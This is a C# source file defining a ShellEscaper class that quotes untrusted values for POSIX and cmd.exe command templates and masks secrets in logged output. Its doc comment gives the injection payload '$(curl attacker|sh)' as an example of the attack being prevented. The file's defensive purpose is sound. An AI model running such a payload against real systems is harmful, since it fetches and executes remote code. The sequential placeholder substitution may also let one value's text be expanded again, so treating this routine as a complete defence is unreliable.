using System.Runtime.InteropServices;

namespace Menuki.Engine;

/// <summary>
/// Makes user/agent-supplied values safe to splice into a shell command string.
///
/// A <c>command_template</c> is trusted (it comes from the config), but the values
/// substituted into its <c>{placeholders}</c> are not. Without quoting, a value like
/// <c>$(curl attacker|sh)</c> would be evaluated by the shell - a full RCE. Every
/// substituted value is therefore wrapped so the shell treats it as a single, literal
/// argument. Placeholders in a template must be bare (e.g. <c>ssh deploy@{host}</c>,
/// not <c>"{host}"</c>); the quoting is added here.
/// </summary>
public static class ShellEscaper
{
    /// <summary>Quote a value for the current platform's shell.</summary>
    public static string Quote(string value) =>
        RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? QuoteWindows(value) : QuotePosix(value);

    /// <summary>
    /// POSIX single-quote a value: wrap in <c>'...'</c> (which disables every shell
    /// metacharacter) and encode any embedded quote as <c>'\''</c>.
    /// </summary>
    public static string QuotePosix(string value) =>
        "'" + value.Replace("'", "'\\''") + "'";

    /// <summary>
    /// Best-effort quoting for <c>cmd.exe</c>: wrap in double quotes (which neutralizes
    /// <c>&amp; | &lt; &gt; ^</c>), double up embedded quotes, and strip <c>%</c> and
    /// <c>!</c> so environment/delayed-expansion cannot be triggered. cmd quoting is
    /// inherently lossy; these characters are removed rather than preserved.
    /// </summary>
    public static string QuoteWindows(string value)
    {
        var sanitized = value.Replace("%", "").Replace("!", "");
        return "\"" + sanitized.Replace("\"", "\"\"") + "\"";
    }

    /// <summary>
    /// Substitute <c>{name}</c> placeholders in <paramref name="template"/> with the
    /// shell-quoted values. This is the only safe way to build a runnable command from
    /// untrusted input.
    /// </summary>
    public static string Interpolate(string template, IReadOnlyDictionary<string, string> values)
    {
        var command = template;
        foreach (var kv in values)
            command = command.Replace($"{{{kv.Key}}}", Quote(kv.Value));
        return command;
    }

    /// <summary>
    /// Like <see cref="Interpolate"/> but for display/logging: values whose name is in
    /// <paramref name="secretNames"/> are shown as <c>***</c> instead of their real value,
    /// so secrets never reach the console or the headless JSON output.
    /// </summary>
    public static string InterpolateForDisplay(
        string template, IReadOnlyDictionary<string, string> values, ISet<string> secretNames)
    {
        var command = template;
        foreach (var kv in values)
        {
            var shown = secretNames.Contains(kv.Key) ? "***" : Quote(kv.Value);
            command = command.Replace($"{{{kv.Key}}}", shown);
        }
        return command;
    }
}
